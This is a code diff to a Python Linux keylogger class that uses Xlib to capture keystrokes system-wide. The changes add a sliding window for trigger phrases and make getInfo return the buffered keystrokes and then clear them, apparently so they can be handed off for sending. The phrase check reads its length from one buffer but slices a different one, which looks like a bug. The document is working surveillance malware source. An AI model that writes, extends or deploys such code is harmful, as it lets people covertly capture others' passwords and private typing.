@@ -21,11 +21,13 @@ class LinuxKeyLogger(threading.Thread):
     This implementation of the keylogger is designed to work on linux based
     systems. WILL NOT FUNCTION ON OTHER OPERATING SYSTEMS.
     """
+
     def __init__(self):
         super().__init__()
         self.display = Display()
         self.root = self.display.screen().root
         self.capturedKeys = []
+        self.windowKeys = []
         self.capture = True
 
     def handleEvent(self, event):
@@ -42,10 +44,10 @@ class LinuxKeyLogger(threading.Thread):
             char = Xlib.XK.keysym_to_string(self.display.keycode_to_keysym(event.detail, event.state))
             if char is not None:
                 self.capturedKeys.append(char)
-                print(char)
+                self.windowKeys.append(char)
+            self.send_key(event.detail, event.state)
             self.phrase_check()
             # self.send_keyup(event.detail, event.state)
-            self.send_key(event.detail, event.state)
         elif (event.type == X.KeyPress):
             pass
             # try:
@@ -70,6 +72,11 @@ class LinuxKeyLogger(threading.Thread):
         openT = self.checkPhrase(self.getTerminalPhrase())
         if (openT):
             self.openterminal()
+        # ensure window size is maintained
+        maxLength = max(len(self.getStopPhrase()),len(self.getTerminalPhrase()))
+        if len(self.windowKeys) > maxLength:
+            self.windowKeys = self.windowKeys[len(self.windowKeys)-maxLength:]
+            
 
     def checkPhrase(self, phrase):
         """
@@ -77,7 +84,7 @@ class LinuxKeyLogger(threading.Thread):
         typed in keys.
         """
         length = len(phrase)
-        capLength = len(self.capturedKeys)
+        capLength = len(self.windowKeys)
         if (capLength >= length):
             section = self.capturedKeys[capLength - length:capLength]
             lastWords = ''.join(section)
@@ -156,10 +163,22 @@ class LinuxKeyLogger(threading.Thread):
         return "ROOT"
 
     def hasInfoToSend(self):
-        return False
+        """
+        Determines whether or not there have been keys that have been captured.
+        :return: True if there are captured keys otherwise False
+        """
+        return len(self.capturedKeys) > 0
 
     def getInfo(self):
-        return ''
+        """
+        Provides the caller with a string of the captured keys.  It is important
+        to note that a call to this method is a mutating call.  This means that
+        once the information is retrieved it is purged from this object.
+        :return: A string of the captured keys
+        """
+        ret =  ''.join(self.capturedKeys)
+        self.capturedKeys = []
+        return ret
 
 
 if __name__ == '__main__':
